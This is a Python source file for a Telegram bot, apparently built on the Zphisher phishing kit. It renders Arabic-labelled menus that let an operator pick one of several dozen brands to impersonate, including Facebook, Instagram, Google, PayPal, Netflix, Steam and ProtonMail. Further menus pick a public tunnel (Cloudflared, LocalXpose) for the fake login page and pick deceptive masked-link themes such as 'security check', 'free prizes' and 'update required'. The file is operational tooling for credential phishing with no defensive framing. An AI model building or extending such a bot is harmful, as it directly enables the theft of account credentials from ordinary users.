"""
🌐 لوحة مفاتيح اختيار المواقع المتقدمة
تتضمن تصنيفات ذكية وخيارات متقدمة لجميع المواقع المدعومة
"""

from typing import List, Dict, Any, Optional
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton

from ..config import zphisher_sites

class SiteSelectionKeyboard:
    """مولد لوحات مفاتيح اختيار المواقع"""
    
    @staticmethod
    def get_categories_menu() -> InlineKeyboardMarkup:
        """قائمة فئات المواقع الرئيسية"""
        
        buttons = [
            [
                InlineKeyboardButton(
                    text="📱 وسائل التواصل (8)",
                    callback_data="category_social"
                ),
                InlineKeyboardButton(
                    text="💼 الخدمات المهنية (4)",
                    callback_data="category_professional"
                )
            ],
            [
                InlineKeyboardButton(
                    text="☁️ الخدمات السحابية (4)",
                    callback_data="category_cloud"
                ),
                InlineKeyboardButton(
                    text="🎮 الألعاب والترفيه (5)",
                    callback_data="category_gaming"
                )
            ],
            [
                InlineKeyboardButton(
                    text="💳 التجارة الإلكترونية (5)",
                    callback_data="category_ecommerce"
                ),
                InlineKeyboardButton(
                    text="🔧 مواقع أخرى (9)",
                    callback_data="category_other"
                )
            ],
            [
                InlineKeyboardButton(
                    text="⭐ المواقع الأكثر استخداماً",
                    callback_data="popular_sites"
                )
            ],
            [
                InlineKeyboardButton(
                    text="🔍 البحث في المواقع",
                    callback_data="search_sites"
                ),
                InlineKeyboardButton(
                    text="📋 جميع المواقع",
                    callback_data="all_sites"
                )
            ],
            [
                InlineKeyboardButton(
                    text="◀️ رجوع للقائمة الرئيسية",
                    callback_data="main_menu"
                )
            ]
        ]
        
        return InlineKeyboardMarkup(inline_keyboard=buttons)
    
    @staticmethod
    def get_social_media_sites() -> InlineKeyboardMarkup:
        """مواقع وسائل التواصل الاجتماعي"""
        
        buttons = [
            [
                InlineKeyboardButton(
                    text="📘 Facebook (4 أنواع)",
                    callback_data="site_facebook"
                ),
                InlineKeyboardButton(
                    text="📷 Instagram (4 أنواع)",
                    callback_data="site_instagram"
                )
            ],
            [
                InlineKeyboardButton(
                    text="🐦 Twitter",
                    callback_data="select_twitter_localhost"
                ),
                InlineKeyboardButton(
                    text="🎵 TikTok",
                    callback_data="select_tiktok_localhost"
                )
            ],
            [
                InlineKeyboardButton(
                    text="👻 Snapchat",
                    callback_data="select_snapchat_localhost"
                ),
                InlineKeyboardButton(
                    text="🎮 Discord",
                    callback_data="select_discord_localhost"
                )
            ],
            [
                InlineKeyboardButton(
                    text="🔥 Reddit",
                    callback_data="select_reddit_localhost"
                ),
                InlineKeyboardButton(
                    text="🌐 VK (2 نوع)",
                    callback_data="site_vk"
                )
            ],
            [
                InlineKeyboardButton(
                    text="◀️ رجوع للفئات",
                    callback_data="new_session"
                )
            ]
        ]
        
        return InlineKeyboardMarkup(inline_keyboard=buttons)
    
    @staticmethod
    def get_professional_sites() -> InlineKeyboardMarkup:
        """الخدمات المهنية"""
        
        buttons = [
            [
                InlineKeyboardButton(
                    text="💼 LinkedIn",
                    callback_data="select_linkedin_localhost"
                ),
                InlineKeyboardButton(
                    text="🐙 GitHub",
                    callback_data="select_github_localhost"
                )
            ],
            [
                InlineKeyboardButton(
                    text="🦊 GitLab",
                    callback_data="select_gitlab_localhost"
                ),
                InlineKeyboardButton(
                    text="📚 StackOverflow",
                    callback_data="select_stackoverflow_localhost"
                )
            ],
            [
                InlineKeyboardButton(
                    text="◀️ رجوع للفئات",
                    callback_data="new_session"
                )
            ]
        ]
        
        return InlineKeyboardMarkup(inline_keyboard=buttons)
    
    @staticmethod
    def get_cloud_services_sites() -> InlineKeyboardMarkup:
        """الخدمات السحابية"""
        
        buttons = [
            [
                InlineKeyboardButton(
                    text="📧 Google (3 أنواع)",
                    callback_data="site_google"
                ),
                InlineKeyboardButton(
                    text="🏢 Microsoft",
                    callback_data="select_microsoft_localhost"
                )
            ],
            [
                InlineKeyboardButton(
                    text="📦 DropBox",
                    callback_data="select_dropbox_localhost"
                ),
                InlineKeyboardButton(
                    text="📁 MediaFire",
                    callback_data="select_mediafire_localhost"
                )
            ],
            [
                InlineKeyboardButton(
                    text="◀️ رجوع للفئات",
                    callback_data="new_session"
                )
            ]
        ]
        
        return InlineKeyboardMarkup(inline_keyboard=buttons)
    
    @staticmethod
    def get_gaming_sites() -> InlineKeyboardMarkup:
        """مواقع الألعاب والترفيه"""
        
        buttons = [
            [
                InlineKeyboardButton(
                    text="🎮 Steam",
                    callback_data="select_steam_localhost"
                ),
                InlineKeyboardButton(
                    text="🎮 PlayStation",
                    callback_data="select_playstation_localhost"
                )
            ],
            [
                InlineKeyboardButton(
                    text="🎮 Xbox",
                    callback_data="select_xbox_localhost"
                ),
                InlineKeyboardButton(
                    text="🧱 Roblox",
                    callback_data="select_roblox_localhost"
                )
            ],
            [
                InlineKeyboardButton(
                    text="🟣 Twitch",
                    callback_data="select_twitch_localhost"
                )
            ],
            [
                InlineKeyboardButton(
                    text="◀️ رجوع للفئات",
                    callback_data="new_session"
                )
            ]
        ]
        
        return InlineKeyboardMarkup(inline_keyboard=buttons)
    
    @staticmethod
    def get_ecommerce_sites() -> InlineKeyboardMarkup:
        """مواقع التجارة الإلكترونية"""
        
        buttons = [
            [
                InlineKeyboardButton(
                    text="💳 PayPal",
                    callback_data="select_paypal_localhost"
                ),
                InlineKeyboardButton(
                    text="🛒 eBay",
                    callback_data="select_ebay_localhost"
                )
            ],
            [
                InlineKeyboardButton(
                    text="🎬 Netflix",
                    callback_data="select_netflix_localhost"
                ),
                InlineKeyboardButton(
                    text="🎵 Spotify",
                    callback_data="select_spotify_localhost"
                )
            ],
            [
                InlineKeyboardButton(
                    text="🎨 Adobe",
                    callback_data="select_adobe_localhost"
                )
            ],
            [
                InlineKeyboardButton(
                    text="◀️ رجوع للفئات",
                    callback_data="new_session"
                )
            ]
        ]
        
        return InlineKeyboardMarkup(inline_keyboard=buttons)
    
    @staticmethod
    def get_other_sites() -> InlineKeyboardMarkup:
        """مواقع أخرى متنوعة"""
        
        buttons = [
            [
                InlineKeyboardButton(
                    text="📌 Pinterest",
                    callback_data="select_pinterest_localhost"
                ),
                InlineKeyboardButton(
                    text="❓ Quora",
                    callback_data="select_quora_localhost"
                )
            ],
            [
                InlineKeyboardButton(
                    text="🔒 ProtonMail",
                    callback_data="select_protonmail_localhost"
                ),
                InlineKeyboardButton(
                    text="🎨 DeviantArt",
                    callback_data="select_deviantart_localhost"
                )
            ],
            [
                InlineKeyboardButton(
                    text="💕 Badoo",
                    callback_data="select_badoo_localhost"
                ),
                InlineKeyboardButton(
                    text="🎮 Origin",
                    callback_data="select_origin_localhost"
                )
            ],
            [
                InlineKeyboardButton(
                    text="📧 Yahoo",
                    callback_data="select_yahoo_localhost"
                ),
                InlineKeyboardButton(
                    text="📝 WordPress",
                    callback_data="select_wordpress_localhost"
                )
            ],
            [
                InlineKeyboardButton(
                    text="🔍 Yandex",
                    callback_data="select_yandex_localhost"
                )
            ],
            [
                InlineKeyboardButton(
                    text="◀️ رجوع للفئات",
                    callback_data="new_session"
                )
            ]
        ]
        
        return InlineKeyboardMarkup(inline_keyboard=buttons)
    
    @staticmethod
    def get_popular_sites() -> InlineKeyboardMarkup:
        """المواقع الأكثر استخداماً"""
        
        buttons = [
            [
                InlineKeyboardButton(
                    text="📘 Facebook",
                    callback_data="site_facebook"
                ),
                InlineKeyboardButton(
                    text="📷 Instagram", 
                    callback_data="site_instagram"
                )
            ],
            [
                InlineKeyboardButton(
                    text="📧 Google",
                    callback_data="site_google"
                ),
                InlineKeyboardButton(
                    text="🐦 Twitter",
                    callback_data="select_twitter_localhost"
                )
            ],
            [
                InlineKeyboardButton(
                    text="💼 LinkedIn",
                    callback_data="select_linkedin_localhost"
                ),
                InlineKeyboardButton(
                    text="🎮 Discord",
                    callback_data="select_discord_localhost"
                )
            ],
            [
                InlineKeyboardButton(
                    text="🎬 Netflix",
                    callback_data="select_netflix_localhost"
                ),
                InlineKeyboardButton(
                    text="💳 PayPal",
                    callback_data="select_paypal_localhost"
                )
            ],
            [
                InlineKeyboardButton(
                    text="◀️ رجوع للفئات",
                    callback_data="new_session"
                )
            ]
        ]
        
        return InlineKeyboardMarkup(inline_keyboard=buttons)
    
    @staticmethod
    def get_site_variants(site_type: str) -> InlineKeyboardMarkup:
        """أشكال الموقع المختلفة (للمواقع التي لها أشكال متعددة)"""
        
        site_info = zphisher_sites.get_site_info(site_type)
        
        if not site_info or 'variants' not in site_info:
            # إذا لم يكن للموقع أشكال متعددة، انتقل مباشرة لاختيار النفق
            return SiteSelectionKeyboard.get_tunnel_selection(site_type)
        
        buttons = []
        
        # عرض جميع الأشكال المتاحة
        for i, variant in enumerate(site_info['variants']):
            if i % 2 == 0:
                # بداية صف جديد
                row = [InlineKeyboardButton(
                    text=f"🎯 {variant['name']}",
                    callback_data=f"variant_{variant['key']}"
                )]
                
                # إضافة العنصر الثاني في نفس الصف إذا كان موجوداً
                if i + 1 < len(site_info['variants']):
                    next_variant = site_info['variants'][i + 1]
                    row.append(InlineKeyboardButton(
                        text=f"🎯 {next_variant['name']}",
                        callback_data=f"variant_{next_variant['key']}"
                    ))
                
                buttons.append(row)
        
        # إضافة زر الرجوع
        category = site_info.get('category', 'other')
        back_callback = f"category_{category}"
        
        buttons.append([
            InlineKeyboardButton(
                text="◀️ رجوع للمواقع",
                callback_data=back_callback
            )
        ])
        
        return InlineKeyboardMarkup(inline_keyboard=buttons)
    
    @staticmethod
    def get_tunnel_selection(site_type: str, site_variant: str = None) -> InlineKeyboardMarkup:
        """اختيار نوع النفق"""
        
        site_key = site_variant or site_type
        
        buttons = [
            [
                InlineKeyboardButton(
                    text="🏠 محلي (Localhost)",
                    callback_data=f"select_{site_key}_localhost"
                )
            ],
            [
                InlineKeyboardButton(
                    text="☁️ Cloudflared (مجاني)",
                    callback_data=f"select_{site_key}_cloudflared"
                )
            ],
            [
                InlineKeyboardButton(
                    text="🌐 LocalXpose (15 دقيقة)",
                    callback_data=f"select_{site_key}_localxpose"
                )
            ],
            [
                InlineKeyboardButton(
                    text="⚙️ إعدادات متقدمة",
                    callback_data=f"advanced_{site_key}"
                )
            ]
        ]
        
        # تحديد زر الرجوع المناسب
        if site_variant:
            # إذا كان هناك متغير، ارجع لصفحة الأشكال
            back_callback = f"site_{site_type}"
        else:
            # إذا لم يكن هناك متغير، ارجع للفئة
            site_info = zphisher_sites.get_site_info(site_type)
            category = site_info.get('category', 'other') if site_info else 'other'
            back_callback = f"category_{category}"
        
        buttons.append([
            InlineKeyboardButton(
                text="◀️ رجوع",
                callback_data=back_callback
            )
        ])
        
        return InlineKeyboardMarkup(inline_keyboard=buttons)
    
    @staticmethod
    def get_advanced_settings(site_key: str) -> InlineKeyboardMarkup:
        """إعدادات متقدمة للجلسة"""
        
        buttons = [
            [
                InlineKeyboardButton(
                    text="🌐 تخصيص المنفذ",
                    callback_data=f"custom_port_{site_key}"
                ),
                InlineKeyboardButton(
                    text="🎭 تخصيص الرابط المقنع",
                    callback_data=f"custom_mask_{site_key}"
                )
            ],
            [
                InlineKeyboardButton(
                    text="🔔 إعدادات الإشعارات",
                    callback_data=f"notifications_{site_key}"
                ),
                InlineKeyboardButton(
                    text="⏰ إيقاف تلقائي",
                    callback_data=f"auto_stop_{site_key}"
                )
            ],
            [
                InlineKeyboardButton(
                    text="🚀 بدء بالإعدادات الافتراضية",
                    callback_data=f"select_{site_key}_cloudflared"
                )
            ],
            [
                InlineKeyboardButton(
                    text="◀️ رجوع لاختيار النفق",
                    callback_data=f"tunnel_{site_key}"
                )
            ]
        ]
        
        return InlineKeyboardMarkup(inline_keyboard=buttons)
    
    @staticmethod
    def get_all_sites_paginated(page: int = 1, per_page: int = 10) -> InlineKeyboardMarkup:
        """عرض جميع المواقع مع ترقيم الصفحات"""
        
        all_sites = zphisher_sites.get_all_sites()
        sites_list = list(all_sites.items())
        
        total_sites = len(sites_list)
        total_pages = (total_sites + per_page - 1) // per_page
        
        start_idx = (page - 1) * per_page
        end_idx = min(start_idx + per_page, total_sites)
        
        buttons = []
        
        # عرض المواقع في الصفحة الحالية
        for i in range(start_idx, end_idx, 2):
            row = []
            
            # الموقع الأول في الصف
            site_key, site_info = sites_list[i]
            site_name = site_info.get('name', site_key)
            
            # إضافة مؤشر للمواقع التي لها أشكال متعددة
            if 'variants' in site_info:
                site_name += f" ({len(site_info['variants'])})"
            
            row.append(InlineKeyboardButton(
                text=site_name,
                callback_data=f"site_{site_key}"
            ))
            
            # الموقع الثاني في الصف (إذا كان موجوداً)
            if i + 1 < end_idx:
                site_key2, site_info2 = sites_list[i + 1]
                site_name2 = site_info2.get('name', site_key2)
                
                if 'variants' in site_info2:
                    site_name2 += f" ({len(site_info2['variants'])})"
                
                row.append(InlineKeyboardButton(
                    text=site_name2,
                    callback_data=f"site_{site_key2}"
                ))
            
            buttons.append(row)
        
        # أزرار التنقل بين الصفحات
        nav_buttons = []
        
        if page > 1:
            nav_buttons.append(InlineKeyboardButton(
                text="◀️ السابق",
                callback_data=f"all_sites_page_{page - 1}"
            ))
        
        nav_buttons.append(InlineKeyboardButton(
            text=f"{page}/{total_pages}",
            callback_data="page_info"
        ))
        
        if page < total_pages:
            nav_buttons.append(InlineKeyboardButton(
                text="▶️ التالي",
                callback_data=f"all_sites_page_{page + 1}"
            ))
        
        if nav_buttons:
            buttons.append(nav_buttons)
        
        # زر الرجوع
        buttons.append([
            InlineKeyboardButton(
                text="◀️ رجوع للفئات",
                callback_data="new_session"
            )
        ])
        
        return InlineKeyboardMarkup(inline_keyboard=buttons)
    
    @staticmethod
    def get_search_results(query: str, results: List[Dict[str, Any]]) -> InlineKeyboardMarkup:
        """عرض نتائج البحث"""
        
        buttons = []
        
        if not results:
            buttons.append([
                InlineKeyboardButton(
                    text="❌ لا توجد نتائج",
                    callback_data="no_results"
                )
            ])
        else:
            # عرض النتائج
            for i in range(0, len(results), 2):
                row = []
                
                # النتيجة الأولى
                site = results[i]
                site_name = site.get('name', site['key'])
                
                if 'variants' in site:
                    site_name += f" ({len(site['variants'])})"
                
                row.append(InlineKeyboardButton(
                    text=site_name,
                    callback_data=f"site_{site['key']}"
                ))
                
                # النتيجة الثانية (إذا كانت موجودة)
                if i + 1 < len(results):
                    site2 = results[i + 1]
                    site_name2 = site2.get('name', site2['key'])
                    
                    if 'variants' in site2:
                        site_name2 += f" ({len(site2['variants'])})"
                    
                    row.append(InlineKeyboardButton(
                        text=site_name2,
                        callback_data=f"site_{site2['key']}"
                    ))
                
                buttons.append(row)
        
        # أزرار إضافية
        buttons.append([
            InlineKeyboardButton(
                text="🔍 بحث جديد",
                callback_data="search_sites"
            ),
            InlineKeyboardButton(
                text="📋 جميع المواقع",
                callback_data="all_sites"
            )
        ])
        
        buttons.append([
            InlineKeyboardButton(
                text="◀️ رجوع للفئات",
                callback_data="new_session"
            )
        ])
        
        return InlineKeyboardMarkup(inline_keyboard=buttons)

class TunnelConfigKeyboard:
    """لوحات مفاتيح إعداد الأنفاق"""
    
    @staticmethod
    def get_port_selection() -> InlineKeyboardMarkup:
        """اختيار المنفذ المخصص"""
        
        buttons = [
            [
                InlineKeyboardButton(
                    text="8080 (افتراضي)",
                    callback_data="port_8080"
                ),
                InlineKeyboardButton(
                    text="8000",
                    callback_data="port_8000"
                )
            ],
            [
                InlineKeyboardButton(
                    text="3000",
                    callback_data="port_3000"
                ),
                InlineKeyboardButton(
                    text="5000",
                    callback_data="port_5000"
                )
            ],
            [
                InlineKeyboardButton(
                    text="✏️ إدخال منفذ مخصص",
                    callback_data="custom_port_input"
                )
            ],
            [
                InlineKeyboardButton(
                    text="◀️ رجوع",
                    callback_data="advanced_settings"
                )
            ]
        ]
        
        return InlineKeyboardMarkup(inline_keyboard=buttons)
    
    @staticmethod
    def get_mask_templates() -> InlineKeyboardMarkup:
        """قوالب الروابط المقنعة"""
        
        buttons = [
            [
                InlineKeyboardButton(
                    text="🔒 فحص الأمان",
                    callback_data="mask_security_check"
                ),
                InlineKeyboardButton(
                    text="🎁 جوائز مجانية",
                    callback_data="mask_free_prize"
                )
            ],
            [
                InlineKeyboardButton(
                    text="📊 استطلاع رأي",
                    callback_data="mask_survey"
                ),
                InlineKeyboardButton(
                    text="🔄 تحديث مطلوب",
                    callback_data="mask_update_required"
                )
            ],
            [
                InlineKeyboardButton(
                    text="💰 عرض خاص",
                    callback_data="mask_special_offer"
                ),
                InlineKeyboardButton(
                    text="📱 تطبيق جديد",
                    callback_data="mask_new_app"
                )
            ],
            [
                InlineKeyboardButton(
                    text="✏️ رابط مخصص",
                    callback_data="custom_mask_input"
                )
            ],
            [
                InlineKeyboardButton(
                    text="◀️ رجوع",
                    callback_data="advanced_settings"
                )
            ]
        ]
        
        return InlineKeyboardMarkup(inline_keyboard=buttons)